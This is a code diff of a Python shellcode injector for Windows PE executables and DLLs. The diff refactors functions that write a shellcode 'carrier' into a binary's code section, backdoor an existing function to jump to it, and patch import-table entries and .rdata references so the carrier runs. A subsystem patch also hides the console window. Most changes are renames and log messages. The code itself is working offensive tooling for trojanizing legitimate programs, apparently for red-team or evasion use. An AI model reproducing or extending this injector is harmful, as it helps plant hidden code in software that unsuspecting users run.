@@ -42,17 +42,18 @@ def inject_exe(carrier_shc: bytes, settings: Settings, carrier: Carrier, payload
         # skip available
         addr = superpe.get_vaddr_of_iatentry(iatRequest.name)
         if addr != None:
-            logger.info("    IAT {} is at: 0x{:X}".format(iatRequest.name, addr))
+            logger.info("    Request IAT {} is available at 0x{:X}".format(
+                iatRequest.name, addr))
             continue
         iat_name = superpe.get_replacement_iat_for("KERNEL32.dll", iatRequest.name)
 
         if not settings.fix_missing_iat:
             raise Exception("Error: {} not available, but fix_missing_iat is False".format(
-                iatRequest.name
-            ))
+                iatRequest.name))
         # do the patch
         superpe.patch_iat_entry("KERNEL32.dll", iat_name, iatRequest.name)
-
+        #logger.info("    Unavailable IAT {} now patched".format(
+        #        iatRequest.name))
     # we modify the IAT raw, so reparsing is required
     superpe.pe.parse_data_directories()
     superpe.init_iat_entries()
@@ -78,17 +79,17 @@ def inject_exe(carrier_shc: bytes, settings: Settings, carrier: Carrier, payload
 
     else:  # EXE/DLL
         # Put it somewhere in the code section, and rewire the flow
-        sect = superpe.get_code_section()
-        if sect == None:
+        code_section = superpe.get_code_section()
+        if code_section == None:
             raise Exception('Could not find code section in input PE file!')
-        sect_size = sect.Misc_VirtualSize  # Better than: SizeOfRawData
+        sect_size = code_section.Misc_VirtualSize  # Better than: SizeOfRawData
         if sect_size < carrier_shc_len + CODE_INJECT_SIZE_CHECK_ADD:
             raise Exception("Shellcode too large: {}+{} > {}".format(
                 carrier_shc_len, CODE_INJECT_SIZE_CHECK_ADD, sect_size
             ))
         carrier_shc_offset = int((sect_size - carrier_shc_len) / 2)  # centered in the .text section
         #shellcode_offset = round_up_to_multiple_of_8(shellcode_offset)
-        carrier_shc_offset += sect.PointerToRawData
+        carrier_shc_offset += code_section.PointerToRawData
         shellcode_rva = superpe.pe.get_rva_from_offset(carrier_shc_offset)
 
         # Aligning the payload (not carrier!) to page size is important for dll_loader_change
@@ -97,8 +98,8 @@ def inject_exe(carrier_shc: bytes, settings: Settings, carrier: Carrier, payload
             shellcode_rva = align_to_page_size(shellcode_rva, carrier_shc_len - len(payload.payload_data))
             carrier_shc_offset = superpe.pe.get_offset_from_rva(shellcode_rva)
 
-        logger.info("---( Inject: Write Shellcode to offset:0x{:X} (rva:0x{:X})".format(
-            carrier_shc_offset, shellcode_rva))
+        logger.info("---( Inject: Write Carrier to 0x{:X} (0x{:X})".format(
+            shellcode_rva, carrier_shc_offset))
 
         # Copy the shellcode
         superpe.pe.set_bytes_at_offset(carrier_shc_offset, carrier_shc)
@@ -127,11 +128,11 @@ def inject_exe(carrier_shc: bytes, settings: Settings, carrier: Carrier, payload
                     addr))
                 function_backdoorer.backdoor_function(addr, shellcode_rva, carrier_shc_len)
 
-    logger.info("--( Fix shellcode to re-use IAT entries")
+    logger.info("--( Fix imports and make carrier reference IAT")
     injected_fix_iat(superpe, carrier)
-    logger.info("--( Fix shellcode to reference data stored in .rdata")
+    logger.info("--( Insert and reference carrier data")
     injected_fix_data(superpe, carrier, 
-                      carrier_shc_offset + carrier_shc_len)
+                      carrier_shc_offset + carrier_shc_len + 4096)
 
     # changes from console to UI (no console window) if necessary
     superpe.patch_subsystem()
@@ -150,25 +151,29 @@ def injected_fix_iat(superpe: SuperPe, carrier: Carrier):
     """replace IAT-placeholders in shellcode with call's to the IAT"""
     code = superpe.get_code_section_data()
     for iatRequest in carrier.get_all_iat_requests():
-        if not iatRequest.placeholder in code:
-            raise Exception("IatResolve ID {} not found, abort".format(iatRequest.placeholder))
-        offset_from_code = code.index(iatRequest.placeholder)
-        
-        # Note that the SuperPe may already have been patched for new IAT imports
-        destination_virtual_address = superpe.get_vaddr_of_iatentry(iatRequest.name)
-        if destination_virtual_address == None:
-            raise Exception("IatResolve: Function {} not found".format(iatRequest.name))
-        
-        instruction_virtual_address = offset_from_code + carrier.superpe.get_image_base() + carrier.superpe.get_code_section().VirtualAddress
-        logger.info("      Replace {} at VA 0x{:X} with: call to IAT at VA 0x{:X}".format(
-            iatRequest.placeholder.hex(), instruction_virtual_address, destination_virtual_address
-        ))
-        jmp = assemble_relative_call(instruction_virtual_address, destination_virtual_address)
-        if len(jmp) != len(iatRequest.placeholder):
-            raise Exception("IatResolve: Call to IAT has different length than placeholder: {} != {} abort".format(
-                len(jmp), len(iatRequest.placeholder)
+        for placeholder in iatRequest.references:
+            if not placeholder in code:
+                raise Exception("IatResolve ID {} not found, abort".format(placeholder))
+            offset_from_code = code.index(placeholder)
+            
+            # Note that the SuperPe may already have been patched for new IAT imports
+            destination_virtual_address = superpe.get_vaddr_of_iatentry(iatRequest.name)
+            if destination_virtual_address == None:
+                raise Exception("IatResolve: Function {} not found".format(iatRequest.name))
+            
+            instruction_virtual_address = offset_from_code + carrier.superpe.get_image_base() + carrier.superpe.get_code_section().VirtualAddress
+            logger.info("      Replace {} at VA 0x{:X} with: call to IAT at VA 0x{:X} ({})".format(
+                placeholder.hex(), 
+                instruction_virtual_address,
+                destination_virtual_address,
+                iatRequest.name
             ))
-        code = code.replace(iatRequest.placeholder, jmp)
+            jmp = assemble_relative_call(instruction_virtual_address, destination_virtual_address)
+            if len(jmp) != len(placeholder):
+                raise Exception("IatResolve: Call to IAT has different length than placeholder: {} != {} abort".format(
+                    len(jmp), len(placeholder)
+                ))
+            code = code.replace(placeholder, jmp)
 
     superpe.write_code_section_data(code)
 
@@ -221,25 +226,25 @@ def injected_fix_data(superpe: SuperPe, carrier: Carrier, shellcode_offset: int)
     for datareuse_fixup in reusedata_fixups:
         ref: DataReuseReference
         for ref in datareuse_fixup.references:
-            if not ref.randbytes in code:
+            if not ref.placeholder in code:
                 raise Exception("fix data in injectable: DataReuse: ID {} ({}) not found in code section, abort".format(
-                    ref.randbytes.hex(), datareuse_fixup.string_ref))
+                    ref.placeholder.hex(), datareuse_fixup.string_ref))
             
-            offset_from_datasection = code.index(ref.randbytes)
+            offset_from_datasection = code.index(ref.placeholder)
             instruction_virtual_address = offset_from_datasection + carrier.superpe.get_image_base() + carrier.superpe.get_code_section().VirtualAddress
             destination_virtual_address = datareuse_fixup.addr
             logger.info("       Replace bytes {} at VA 0x{:X} with: LEA {} .rdata 0x{:X}".format(
-                ref.randbytes.hex(), instruction_virtual_address, ref.register, destination_virtual_address
+                ref.placeholder.hex(), instruction_virtual_address, ref.register, destination_virtual_address
             ))
             lea = assemble_lea(
                 instruction_virtual_address, destination_virtual_address, ref.register
             )
             asm_disasm(lea, instruction_virtual_address)  # DEBUG
-            if len(lea) != len(ref.randbytes):
+            if len(lea) != len(ref.placeholder):
                 raise Exception("DataReuseFixup: lea instr has different length than placeholder: {} != {} abort".format(
-                    len(lea), len(ref.randbytes)
+                    len(lea), len(ref.placeholder)
                 ))
-            code = code.replace(ref.randbytes, lea)
+            code = code.replace(ref.placeholder, lea)
 
     superpe.write_code_section_data(code)
 
